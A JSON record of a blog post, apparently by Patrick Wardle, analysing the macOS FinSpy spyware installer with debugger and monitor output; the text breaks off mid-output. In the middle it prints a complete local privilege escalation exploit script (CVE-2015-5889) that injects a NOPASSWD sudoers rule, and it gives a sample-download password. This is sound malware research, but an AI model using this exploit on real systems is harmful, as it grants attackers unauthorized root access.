{
    "id": "1c4a06a0-b979-4e8b-9cd7-69b68b24a92d",
    "created_at": "2023-01-12T15:07:41.196954Z",
    "updated_at": "2025-03-27T02:16:25.980288Z",
    "deleted_at": null,
    "sha1_hash": "d27d09836f5a530d6c231c4fe6fb5026e78348c3",
    "title": "2020-09-26 - FinFisher Filleted- a triage of the FinSpy (macOS) malware",
    "authors": "",
    "file_creation_date": "2022-05-29T01:23:28Z",
    "file_modification_date": "2022-05-29T01:23:28Z",
    "file_size": 4199886,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x4F.html**\n\nFinFisher Filleted üêü\n\na triage of the FinSpy (macOS) malware\n\nby: Patrick Wardle / September 26, 2020\n\nLove these blog posts and/or want to support my research and tools? You can support them\nvia my [Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\nüìù üëæ Want to play along?\n[I‚Äôve added the samples (OSX.FinSpy) to our malware collection (password: infect3d)](https://objective-see.com/downloads/malware/FinSpy.zip)\n\n‚Ä¶please don‚Äôt infect yourself!\n\n## Background\n\nRecently, [Claudio Guarnieri highlighted some intriguing new research published by his](https://twitter.com/botherder)\nresearch lab at Amnesty International:\n\nSometimes threat intel is hard, sometimes folks leave all FinFisher samples exposed\non a webserver. So here ya go, along with recent Windows and Android, we're\npublishing details on new FinFisher for Mac OS üçé and Linux\n[üêß.https://t.co/eakdBWcYbF](https://t.co/eakdBWcYbF)\n\n[‚Äî nex (@botherder@mastodon.social) (@botherder) September 25, 2020](https://twitter.com/botherder/status/1309449600110129152?ref_src=twsrc%5Etfw)\n\n\n-----\n\nTitled, German-made FinSpy spyware found in Egypt, and Mac and Linux versions\nrevealed,‚Äù this writeup detailed FinFisher‚Äôs spyware suite (FinSpy), including ‚Äúpreviously\n_undisclosed versions for Linux and MacOS computers‚Äù!_\n\nAs noted in their report:\n\n\"FinSpy is a commercial spyware suite produced by the Munich-based company\nFinFisher Gmbh. Since 2011 researchers have documented numerous cases of\ntargeting of Human Rights Defenders (HRDs) - including activists, journalists, and\ndissidents with the use of FinSpy in many countries, including Bahrain, Ethiopia, UAE,\nand more.\"\n\nAmnesty‚Äôs writeup is great place to start, and provides a lot of great detail and insights about\nFinSpy ‚Ä¶including the newly uncovered macOS variant.\n\nAs such, it is a must read:\n\n[\"German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed\"](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\n**Update**\nOther security researchers have also now published their research:\n\n[‚ÄúThe Finfisher Tales, Chapter 1: The dropper‚Äù (by:](https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/) [@osxreverser).](https://twitter.com/osxreverser)\n\n[‚ÄúHow to Catch a Spy | Detecting FinFisher Spyware on macOS‚Äù (by:](https://www.sentinelone.com/blog/how-to-catch-a-spy-detecting-finfisher-spyware-on-macos/) [@philofishal).](https://twitter.com/philofishal)\n\nIn this blog post, we provide a hands-on triage of the macOS variant of FinSpy. We build\nupon Amnesty International‚Äôs (great) research, as well as cover new components of the\nmalware, such as it‚Äôs kernelmode rootkit component.\n\n## FinSpy, for macOS\n\nAmnesty‚Äôs writeup notes the discovery of a related sample `caglayan-macos.dmg ( SHA1:`\n```\n59180391de409c83bef642ad1bca2999ab5fe328 ) that was ‚Äúfound on Virus Total‚Äù. Our triage\n\n```\nwill focus on this sample, as within the disk image ( .dmg ) is an application bundle, which\nappears be a full, self-contained instance of FinSpy.\n\nTo start, we mount the disk image via the `hdiutil command:`\n```\n$ hdiutil attach ~/Downloads/FinFisher/caglayan-macos.dmg \n/dev/disk2      GUID_partition_scheme      \n/dev/disk2s1     Apple_HFS            /Volumes/caglayan-macos\n\n```\nIf we examine the (now) mounted disk image ( /Volumes/caglayan-macos ), we see it\ncontains a single item: an application bundle named `Install √áaƒülayan :`\n\n\n-----\n\n/Volumes/caglayan-macos/Install √áaƒülayan.app\nRather unsurprisingly, [WhatsYourSign shows that this application is unsigned:](https://objective-see.com/products/whatsyoursign.html)\n\nInstall\n\n√áaƒülayan.app ...unsigned\nWe can also confirm the application is unsigned via macOS‚Äôs built-in `codesign utility:`\n```\n$ codesign -dvvv /Volumes/caglayan-macos/Install\\ √áaƒülayan.app \n/Volumes/caglayan-macos/Install √áaƒülayan.app: code object is not signed at all\n\n```\nLet‚Äôs take a peek at the `Install √áaƒülayan.app bundle.`\n\n\n-----\n\n‚Ä¶definitely some ‚Äústrangeness‚Äù going on ü§®:\n\nWhen analyzing a (malicious) application bundle, the application‚Äôs `Info.plist file is a`\n[good place to start. To quote the ‚ÄúArt Of Mac Malware‚Äù:](https://taomm.org/vol1/analysis.html)\n\n\n-----\n\nWhen an application is launched, the system consults the `Info.plist property list`\nfile, as it contains essential (meta)data about the application. Property list files contain\nkey-value pairs.\n\nPairs that may be of interest when analyzing an application include:\n```\n   CFBundleExecutable\n\n```\nContains the name of the application‚Äôs binary (found in `Contents/MacOS ).`\n```\n   CFBundleIdentifier\n\n```\nContains the application‚Äôs bundle identifier (often used by the system to globally\nidentify the application).\n```\n   LSMinimumSystemVersion\n\n```\nContains the oldest version of macOS that the application is compatible with.‚Äù\n\nHere‚Äôs the `Install √áaƒülayan application‚Äôs` `Info.plist :`\n\n\n-----\n\n```\n$ cat /Volumes/caglayan macos/Install √áaƒülayan.app/Contents/Info.plist \n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n  <dict>\n    <key>BuildMachineOSBuild</key>\n    <string>12F45</string>\n    <key>CFBundleAllowMixedLocalizations</key>\n    <true/>\n    <key>CFBundleDevelopmentRegion</key>\n    <string>English</string>\n    <key>CFBundleExecutable</key>\n    <string>Install √áaƒülayan</string>\n    <key>CFBundleIconFile</key>\n    <string>NativeInstaller.icns</string>\n    <key>CFBundleIdentifier</key>\n    <string>com.coverpage.bluedome.caglayan.desktop.installer</string>\n    <key>CFBundleInfoDictionaryVersion</key>\n    <string>6.0</string>\n    <key>CFBundlePackageType</key>\n    <string>APPL</string>\n    <key>CFBundleShortVersionString</key>\n    <string>2.0</string>\n    <key>DTCompiler</key>\n    <string>com.apple.compilers.llvm.clang.1_0</string>\n    <key>DTPlatformBuild</key>\n    <string>4H1503</string>\n    <key>DTPlatformVersion</key>\n    <string>GM</string>\n    <key>DTSDKBuild</key>\n    <string>10K549</string>\n    <key>DTSDKName</key>\n    <string>macosx10.6</string>\n    <key>DTXcode</key>\n    <string>0463</string>\n    <key>DTXcodeBuild</key>\n    <string>4H1503</string>\n    <key>LSMinimumSystemVersion</key>\n    <string>10.6</string>\n    <key>NSHumanReadableCopyright</key>\n    <string/>\n    <key>NSMainNibFile</key>\n    <string>MainMenu</string>\n    <key>NSPrincipalClass</key>\n    <string>NSApplication</string>\n  </dict>\n</plist>\n\n```\nThe value for the `CFBundleExecutable key is` `Install √áaƒülayan . Meaning the item`\n```\nInstall √áaƒülayan.app/Contents/MacOS/Install √áaƒülayan will be executed when the\n\n```\napplication is launched (by a victim). As such, we‚Äôll continue our analysis there.\n\n\n-----\n\nVarious key-value pairs provide insight into the age of the malware, and malware author s\n(build) machine.\n\nBuildMachineOSBuild -> 12F45 (Mountain Lion 10.8.5)\nDTXcode -> 0463 (Xcode Version 4.6.3)\n\n‚Ä¶yes, rather old!\n\nSomewhat interestingly, the `Install √áaƒülayan.app/Contents/MacOS/Install`\n```\n√áaƒülayan file turns out to be a bash script.\n$ file \"Install √áaƒülayan.app/Contents/MacOS/Install √áaƒülayan\"\nInstall √áaƒülayan.app/Contents/MacOS/Install √áaƒülayan: \n Bourne-Again shell script text executable, UTF-8 Unicode text\n\n```\nLet‚Äôs take a look at this script:\n```\n 1#!/bin/bash\n 2BASEDIR=\"$( cd \"$(dirname \"$0\")\" && pwd)\"\n 3cd \"$BASEDIR\"\n 4open .log/ARA0848.app\n 5sleep 2\n 6rm Install\\ √áaƒülayan\n 7mv installer Install\\ √áaƒülayan\n 8rm -rf .log\n 9./Install\\ √áaƒülayan\n10exit\n\n```\nAfter changing in to the script‚Äôs directory ( cd ), it executes an application ( ARA0848.app )\nfrom a hidden `.log/ directory. It then replaces itself ( Install √áaƒülayan ) with a item`\nnamed `installer . This item ( installer ‚Üí` `Install √áaƒülayan ) is then executed.`\n\n[This can be observed via our Process Monitor:](https://objective-see.com/products/utilities.html#ProcessMonitor)\n\n\n-----\n\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"arguments\" : [\n   \"/bin/bash\",\n   \"/Volumes/caglayan-macos/Install √áaƒülayan.app/Contents/MacOS/Install √áaƒülayan\"\n  ],\n  \"path\" : \"/bin/bash\"\n  ...\n }\n},\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"arguments\" : [\n   \"open\",\n   \".log/ARA0848.app\"\n  ],\n  \"path\" : \"/usr/bin/open\"\n  ...\n }\n},\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"arguments\" : [\n   \"/Volumes/caglayan-macos/Install √áaƒülayan.app/Contents/MacOS/\n    .log/ARA0848.app/Contents/MacOS/installer\"\n  ],\n  \"path\" : \"/Volumes/caglayan-macos/Install √áaƒülayan.app/Contents/MacOS/\n        .log/ARA0848.app/Contents/MacOS/installer\"\n  ...\n }\n},\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"arguments\" : [\n   \"mv\",\n   \"installer\",\n   \"Install √áaƒülayan\"\n  ],\n  \"path\" : \"/bin/mv\"\n  ...\n }\n},\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n\n```\n\n-----\n\n```\n process : {\n  \"arguments\" : [\n   \"./Install √áaƒülayan\"\n  ],\n  \"path\" : \"/Volumes/caglayan-macos/Install √áaƒülayan.app/\n        Contents/MacOS/Install √áaƒülayan\"\n  ...\n }\n}\n\n```\nThe `installer file is a Mach-O binary, signed with an Apple Developer ID ( CoverPage`\n```\ns.r.o. (4F89KD52V4) ):\n$ file \"Install √áaƒülayan.app/Contents/MacOS/installer\"\nInstall √áaƒülayan.app/Contents/MacOS/installer: Mach-O 64-bit executable x86_64\n$ codesign -dvvv \"Install √áaƒülayan.app/Contents/MacOS/installer\"\nExecutable=/Volumes/caglayan-macos/Install √áaƒülayan.app/Contents/MacOS/installer\nIdentifier=com.coverpage.bluedome.caglayan.desktop.installer\nFormat=Mach-O thin (x86_64)\n...\nAuthority=Developer ID Application: CoverPage s.r.o. (4F89KD52V4)\nAuthority=Developer ID Certification Authority\nAuthority=Apple Root CA\nTimestamp=May 30, 2017 at 11:55:46 PM\n\n```\n‚Ä¶a brief triage indicates this binary is not malicious (perhaps it is a legitimate downloader?).\nThis makes sense, as a victim launching the (malicious) application, expects something\n(non-malicious) to visually happen ‚Ä¶otherwise they may become suspicious!\n\nIn this case, (once `installer has been renamed to` `Install √áaƒülayan ‚Ä¶and`\nlaunched), it attempts to install a legitimate version or Adobe Air ‚Ä¶likely needed for the\nlegitimate `√áaƒülayan application to run:`\n\n\n-----\n\nSince this appears benign, lets turn our attention to `.log/ARA0848.app ‚Ä¶which turns out`\nto be the backdoor installer/launcher.\n```\nARA0848.app is another unsigned application (recall, that was launched via the Install\n√áaƒülayan bash script):\n\n```\nWhen executed, it will launch its application binary\n```\nARA0848.app/Contents/MacOS/installer . This (Mach-O) binary is also unsigned:\n\n```\n\n-----\n\n```\n$ file Install\n√áaƒülayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer\"\nInstall √áaƒülayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer: Mach-O\n64-bit executable x86_64\n$ codesign -dvvv \"Install\n√áaƒülayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer\"\n/Volumes/caglayan-macos/Install\n√áaƒülayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer: code object is\nnot signed at all\n$ shasum \"Install\n√áaƒülayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer\"\n2584f1119c65ffd0936e2916b285389404b942c9 /Volumes/caglayan-macos/Install\n√áaƒülayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer\n\n```\n‚Ä¶and its detection, is currently rather limited:\n\nAmnesty‚Äôs [writeup provided a thorough overview of the actions/capabilities of this binary. As](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\nsuch, much of the information in this section was originally reported in their writeup.\n\n‚Ä¶although here, we dig a little deeper, and build upon it.\n\nWhen examining an unknown Mach-O binary, I like to start with the `strings command,`\nwhich (as its name implies) will dump embedded (ASCII) strings. Often this provides valuable\ninsight into the capabilities of the binary!\n\n\n-----\n\n```\n$ strings ARA0848.app/Contents/MacOS/installer\nptrace\nhw.model\nvmware\nvirtualbox\nparallels\nsystem_profiler SPUSBDataType | egrep -i \"Manufacturer:\n(parallels|vmware|virtualbox)\"\n/usr/bin/python\nhelper2\nsystem.privilege.admin\n/bin/launchctl\nload\nunload\n/sbin/kextunload\nhelper\ninstaller\nlogind\n/tmp\n80.bundle.zip\narch.zip\norg.logind.ctp.archive\n80.bundle\nlogind.kext\nlogind.plist\n/Library/LaunchAgents\n\n```\nInteresting! Appears we have strings related to:\n\nanti-debugging? ( \"ptrace\" )\n\nvirtual machine detection? ( \"Manufacturer: (parallels|vmware|virtualbox)\" )\n\npython scripts? ( \"/usr/bin/python\", `\"helper2\" )`\n\nlaunch agent persistence? ( \"/bin/launchctl\", `\"/Library/LaunchAgents\",`\n```\n   \"logind.plist\" )\n\n```\nkernel extension (rootkit)? ( \"logind.kext\" )\n\n[As the binary is written in Objective-C, we can use the class-dump tool to extract embedded](https://github.com/nygard/class-dump)\n(Objective-C) classes:\n\n\n-----\n\n```\n$ class dump ARA0848.app/Contents/MacOS/installer \n__attribute__((visibility(\"hidden\")))\n@interface appAppDelegate : NSObject \n{\n}\n- (BOOL)askUserPermission:(id)arg1;\n- (BOOL)isAfterPatch;\n- (void)removeTraces;\n- (void)launchOldStyle;\n- (BOOL)launchNewStyle;\n- (BOOL)installPayload;\n- (void)executeTrampoline;\n- (void)expandPayload;\n- (void)removeOldResource;\n- (void)applicationDidFinishLaunching:(id)arg1;\n@end\n__attribute__((visibility(\"hidden\")))\n@interface GIFileOps : NSObject\n{\n}\n+ (void)unloadKext;\n+ (BOOL)unloadAgent:(id)arg1;\n+ (BOOL)loadAgent:(id)arg1;\n+ (BOOL)setFile:(id)arg1 withAttributes:(id)arg2;\n+ (BOOL)setDataFileAttributes:(id)arg1;\n+ (BOOL)setExecutableFileAttributes:(id)arg1;\n+ (BOOL)setDirectoryAttributes:(id)arg1;\n+ (id)baseAttributes;\n+ (BOOL)setStandardAttributes:(id)arg1;\n+ (BOOL)setSuid:(id)arg1;\n+ (BOOL)rename:(id)arg1 to:(id)arg2;\n+ (BOOL)remove:(id)arg1;\n+ (BOOL)move:(id)arg1 to:(id)arg2;\n+ (BOOL)createDirectory:(id)arg1 shouldDelete:(BOOL)arg2;\n+ (BOOL)copy:(id)arg1 to:(id)arg2;\n+ (BOOL)unzip:(id)arg1 to:(id)arg2;\n@end\n__attribute__((visibility(\"hidden\")))\n@interface GIPath : NSObject\n{\n}\n+ (id)masterKeyDirSource;\n+ (id)masterKeyDirTarget;\n+ (id)supervisorTarget;\n+ (id)supervisorSource;\n+ (id)supervisorName;\n+ (id)agentTarget;\n\n```\n\n-----\n\n```\n+ (id)agentSource;\n+ (id)agentName;\n+ (id)coreTarget;\n+ (id)coreSource;\n+ (id)coreName;\n+ (id)kextTarget;\n+ (id)kextSource;\n+ (id)kextName;\n+ (id)expandedMainBundle;\n+ (id)expandedPayload;\n+ (id)compressedPayload;\n+ (id)updatePackage;\n+ (id)payload;\n+ (id)installer;\n+ (id)trampoline;\n+ (id)systemTemp;\n+ (id)installationMap;\n+ (id)executables;\n@end\n...\n\n```\nAlthough there aren‚Äôt a ton of classes, we definitely have extracted some interesting method\nnames ( \"installPayload\", `\"loadAgent:\",` `\"kextTarget\", etc), which we can`\nanalyze in a disassembler, or set breakpoints in a debugger.\n\nSpeaking of, time to disassemble and debug!\n\nThe malware‚Äôs `main method begins at` `0x000000010000174f . Scrolling thru the`\ndisassembly, it appears that the malware employs some static obfuscation:\n\nIn their [writeup, the Amnesty researchers shed more light on this:](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\n\n\n-----\n\nthe [malware] developers took measures to complicate its analysis. All the binaries are\nobfuscated with the open source LLVM-obfuscator developed by a research team in\n2013.\"\n\nGood news, this obfuscation doesn‚Äôt really hinder analysis. One can simply scroll past it in a\ndisassembler, or in a debugger set breakpoints on relevant (non-obfuscated) code.\n\nAt the start of the malware‚Äôs `main function, it executes various anti-analysis logic including:`\n\ninvoking a function named `deny_ptrace to prevent debugging via ptrace`\n( PT_DENY_ATTACH ).\n\na call to `_sysctl perhaps to check for the` `P_TRACED flag.`\n\nvirtual machine detection via the enumeration of the system `model named, via`\n```\n   sysctlbyname(\"hw.model\" ...) and via system_profiler SPUSBDataType |\n   egrep -i \\\"Manufacturer: (parallels|vmware|virtualbox) .\n\n```\nOnce identified, this anti-analysis logic is trivial to bypass in a debugger. How? Simply set a\nbreakpoint(s), then modify the instruction pointer ( RIP ) to skip over them:\n\nIn the [writeup, the Amnesty researchers note that the malware will decrypt an encrypted](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\narchive:\n\n\"...it then decrypts ...a Zip archive. This archive contains the installer, the main cyload,\nbut also binaries for privilege escalation\"\n\n\n-----\n\n‚Ä¶oh, we definitely want all that!\n\nAt address `0x100003106 (within a method named` `expandPayload ), the malware invokes`\na method from the `GIFileOps named` `unzip:to: . Let‚Äôs set a debugger breakpoint there:`\n```\n(lldb) b 0x0000000100003106\nBreakpoint 5: address = 0x0000000100003106\n\n```\nWhen this breakpoint is hit, we can examine the arguments:\n```\n(lldb) Process 1486 stopped\n* thread #1, queue = 'com.apple.main-thread'\n stop reason = breakpoint 5.1:\n-> 0x100003106 : callq *%r12\n  0x100003109 : movq  %r13, %rdi\n  0x10000310c : callq *0x2cf7e(%rip)\n  0x100003112 : movq  %r15, %rdi\n(lldb) x/s $rsi\n0x10002bc9c: \"unzip:to:\"\n(lldb) po $rdx\n/Users/user/Library/Caches/arch.zip\n(lldb) po $rcx\n/Users/user/Library/Caches\n\n```\nLooks like it will unzip a file named `arch.zip into the user‚Äôs` `/Library/Caches directory.`\n\nIf we then step over this method call (via the `si debugger command), our File Monitor`\npicks up the file events related to the extraction of the ( arch.zip ) archive:\n\n\n-----\n\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor pretty filter installer\nPassword:\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_OPEN\",\n \"file\" : {\n  \"destination\" : \"/Users/user/Library/Caches/arch.zip\",\n  \"process\" : {\n   \"path\" : \"/Volumes/caglayan-macos/Install √áaƒülayan.app/\n         Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer\",\n  ...\n},\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n \"file\" : {\n  \"destination\" : \"/Users/user/Library/Caches/org.logind.ctp.archive\",\n  \"process\" : {\n   \"path\" : \"/Volumes/caglayan-macos/Install √áaƒülayan.app/\n         Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer\",\n  ...\n}\n...\n\n```\nHooray, the malware has (kindly) decrypted and unzipped the archive to\n```\n~/Library/Caches/org.logind.ctp.archive . ‚Ä¶and it is full of goodies:\n\n```\nThe `file command can identify each item‚Äôs file type:`\n\n\n-----\n\n```\n$ file \nhelper:      Mach-O 64-bit executable x86_64\nhelper2:      Python script text executable, ASCII text\nhelper3:      Mach-O executable i386\ninstaller:     Mach-O 64-bit executable x86_64\nlogind:      Mach-O 64-bit executable x86_64\nlogind.kext:    directory\nlogind.plist:   XML 1.0 document text, ASCII text\nstorage.framework: directory\n\n```\n[Several of these are described in the Amnesty writeup, however, others were not.](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\n```\n   helper ( sha1: 72cb14bc737a9d77c040affa60521686ffa80b84 ):\n\n```\nA Mach-O binary that exploits a local privilege escalation vulnerability (in macOS <\n```\n   10.9/10 ).\n\n```\n[Exploit PoC code: https://www.exploit-db.com/exploits/36739.](https://www.exploit-db.com/exploits/36739)\n\n\n-----\n\n```\nhelper2 ( sha1: 9a0ede8fad59e7252502881554be0c21972238c9 ):\n\n```\nA python script that exploits `CVE-2015-5889`\n```\n 1# CVE-2015-5889: issetugid() + rsh + libmalloc osx local root\n 2# tested on osx 10.9.5 / 10.10.5\n 3# jul/2015\n 4# by rebel\n 5\n 6import os,time,sys\n 7\n 8from sys import argv\n 9script, param = argv\n10\n11env = {}\n12\n13s = os.stat(\"/etc/sudoers\").st_size\n14\n15env['MallocLogFile'] = '/etc/crontab'\n16env['MallocStackLogging'] = 'yes'\n17env['MallocStackLoggingDirectory'] = 'a\\n* * * * * root echo \"ALL ALL=(ALL)\nNOPASSWD: \n18                   ALL\" >> /etc/sudoers\\n\\n\\n\\n\\n'\n19\n20#sys.stderr.write(\"creating /etc/crontab..\")\n21\n22p = os.fork()\n23if p == 0: \n24 os.close(1)\n25 os.close(2)\n26 os.execve(\"/usr/bin/rsh\",[\"rsh\",\"localhost\"],env)\n27\n28time.sleep(1)\n29\n30if \"NOPASSWD\" not in open(\"/etc/crontab\").read():\n31 sys.stderr.write(\"failed\\n\")\n32 sys.exit(-1)\n33\n34#sys.stderr.write(\"done\\nwaiting for /etc/sudoers to change (<60 seconds)..\")\n35\n36while os.stat(\"/etc/sudoers\").st_size == s:\n37# sys.stderr.write(\".\") \n38 time.sleep(1)\n39\n40#sys.stderr.write(\"\\ndone\\n\")\n41\n42my_command = \"sudo chmod 06777 %s & sudo chown root:wheel %s\" % (param, param)\n43os.system(my_command)\n\n```\n\n-----\n\n```\nhelper3 ( sha1: 427a1c1daf9030069f0c771ce172c104513a7722 ):\n\n```\nA Mach-O binary that exploits the `tpwn local privilege escalation vulnerability (in`\nmacOS < `10.10.5 ).`\n```\n$ strings -a helper3 \n/mach_kernel\n/System/Library/Kernels/kernel\n/System/Library/Extensions/IOAudioFamily.kext/Contents/MacOS/IOAudioFamily\nposix_cred_get\n_IORecursiveLockUnlock\n__ZN10IOWorkLoop8openGateEv\n__ZN13IOEventSource8openGateEv\nEscalating privileges! -qwertyoruiop\n\n```\n[Exploit PoC code: https://github.com/kpwn/tpwn.](https://github.com/kpwn/tpwn)\n```\ninstaller ( sha1: a65965b960b3d322bbae467f51bf215d574b00cc ):\n\n```\nThe malware installer (details below).\n```\nlogind ( sha1: 62e5dc40bfabaa712cd9e32ac755384db07f0dab ):\n\n```\nThe malware‚Äôs (persistent) launcher (details below).\n```\nlogind.kext ( sha1: 18e1d03e41b5fc6d54fdda340fe2dab219502f3d ):\n\n```\nThe malware‚Äôs rootkit (details below).\n```\nlogind.plist ( sha1: a2aba86d5d763f311dff8250bc8fe98de958bff4 ):\n\n```\nThe malware‚Äôs launch agent property list (for persistence):\n```\n$ cat org.logind.ctp.archive/logind.plist \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n <key>Label</key>\n <string>org.logind</string>\n <key>ProgramArguments</key>\n <array>\n  <string>/private/etc/logind</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n <key>KeepAlive</key>\n <dict>\n  <key>SuccessfulExit</key>\n  <false/>\n </dict>\n</dict>\n</plist>\n\n```\n\n-----\n\nLet s take a closer look at several of these.\n\nFirst, the malware performs various actions requiring root privileges ‚Ä¶which is where the\nlocal privilege escalation vulnerabilities ( helper* ) come into play. If the exploits fail (which\nthey will on any recent version of macOS), the malware falls back to a less sophisticated\napproach:\n\n\"This first stage uses the exploits to get root access. If none of them work, it will ask\nthe user to grant root permissions to launch the next stage installer.\" -Amnesty\nInternational\n\nAnd what does it do with these root privileges? Sets the ‚Äúnext stage‚Äù to be owned by root (via\n```\nchown root:wheel ) with the setuid bit set (via chmod 06777 ):\n$ ls -lart /Users/user/Library/Caches/org.logind.ctp.archive/installer\n-rwsrwsrwx 1 root wheel 63396 Feb 16 2018\n/Users/user/Library/Caches/org.logind.ctp.archive/installer\n\n```\n[As noted in Pedro‚Äôs (@osxreverser) writeup, ‚ÄúThe Finfisher Tales, Chapter 1: The dropper‚Äù](https://twitter.com/osxreverser)\nthis (next stage) installer is then launched via method named `installPayload :`\n\n\n-----\n\n```\n 1// @class appAppDelegate \n 2-(char)installPayload {\n 3  ...\n 4  r14 = [[NSTask alloc] init];\n 5  rbx = [[GIPath installer] retain];\n 6  [r14 setLaunchPath:rbx];\n 7  \n 8  [r14 launch];\n 9  [r14 waitUntilExit];\n10  ...\n11}\n\n```\nThis method simply invokes the `NSTask API to launch the (next-stage) installer. In a`\ndebugger session, we can observe the (launch) path to the ‚Äúnext stage‚Äù installer is\n```\n/Users/user/Library/Caches/org.logind.ctp.archive/installer :\n% lldb .log/ARA0848.app/Contents/MacOS/installer \n...\n* thread #1, queue = 'com.apple.main-thread'\n-[appAppDelegate installPayload] + 0x100\n-> 0x1000035e5 : callq *0x2ca9d(%rip)\n  0x1000035eb : movq  %rbx, %rdi\n  0x1000035ee : callq *0x2ca9c(%rip)\n  0x1000035f4 : movq  0x2def5(%rip), %rsi\nTarget 0: (installer) stopped.\n(lldb) po $rdi\n<NSConcreteTask: 0x10024ff30>\n(lldb) x/s $rsi\n0x7fff720e9b0e: \"setLaunchPath:\"\n(lldb) po $rdx\n/Users/user/Library/Caches/org.logind.ctp.archive/installer\n\n```\n[This launching of this installer, can also be passively observed via our Process Monitor:](https://objective-see.com/products/utilities.html#ProcessMonitor)\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"path\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/installer\",\n  \"pid\" : 1610\n  \"ppid\" : 1486,\n }\n}\n\n```\n\n-----\n\n‚Ä¶noting that the parent of the `org.logind.ctp.archive/installer process`\n( \"ppid\":1486 ), is indeed `.log/ARA0848.app/Contents/MacOS/installer :`\n\nDue its owner (root) and the `setuid bit, this ‚Äúnext stage‚Äù installer will run with root`\nprivileges.\n\n## Next Stage Installer ( org.logind.ctp.archive/installer )\n\n[As noted in the Amnesty writeup, this installer performs three actions:](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\n\n1. Copies plugins and config files to `/Library/Frameworks/Storage.framework .`\n2. Copies the launcher ( logind ) to `/private/etc/logind .`\n3. Persists the launcher, by creating a launch agent plist:\n```\n   /System/Library/LaunchAgents/logind.pslist .\n\n```\nLet‚Äôs take a closer look at it now, to highlight the code responsible for these actions.\n\nThe `org.logind.ctp.archive/installer is a Mach-O binary, rather similar (albeit`\nsimpler) than its parent ( .log/ARA0848.app/Contents/MacOS/installer ).\n\nFor example, both contain a custom `GIFileOps class that implements various file related`\nmethods ( copy: to:, `loadAgent, etc.).`\n\nMoreover, we find the `llvm -level obfuscations again:`\n\nThis (next stage) installer‚Äôs main method starts at `0x000000010a3d95ac . The logic the the`\n```\nmain function first checks for the presence of various files (plugins?), such as\n/Library/Frameworks/Storage.framework,\n\n```\n\n-----\n\n```\n/Contents/Resources/7f.bundle/Contents/Resources/AAC.dat . It then builds a\n\n```\ndictionary of key-value pairs via a call to `[GIPath installationMap] :`\n```\n$ lldb org.logind.ctp.archive/installer\n...\n* thread #1, queue = 'com.apple.main-thread'\ninstaller`main:\n-> 0x10a3da37e : callq *0x6d04(%rip) ;objc_msgSend\n(lldb) x/s $rsi\n0x10a3df5c7: \"installationMap\"\n(lldb) ni\n(lldb) po $rax\n{\n  \"/Users/user/Library/Caches/org.logind.ctp.archive/Storage.framework\"\n   ‚Üí \"/Library/Frameworks/Storage.framework\";\n  \"/Users/user/Library/Caches/org.logind.ctp.archive/logind\"\n   ‚Üí \"/private/etc/logind\";\n  \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext\"\n   ‚Üí \"/System/Library/Extensions/logind.kext\";\n  \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist\"\n   ‚Üí \"/Library/LaunchAgents/logind.plist\";\n}\n\n```\nAs we can see in the debugger output, this maps files from the decrypted uncompressed\narchive ( org.logind.ctp.archive ) to their final destinations. The installer then iterates\nover each of these files, and via a block (at `0x000000010a3da4d2 ) moves them from the`\narchive to their (final) destinations:\n```\n1files = [GIPath installationMap];\n2[files enumerateKeysAndObjectsUsingBlock:(void (^)(KeyType src, ObjectType dest,\nBOOL *stop))\n3{\n4\n5  [GIFileOps move:src to:dest];\n6  [GIFileOps setStandardAttributes:dest];\n7\n8}];\n\n```\n[We can passively observe this via our File Monitor:](https://objective-see.com/products/utilities.html#FileMonitor)\n\n\n-----\n\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor pretty filter installer\n{\n 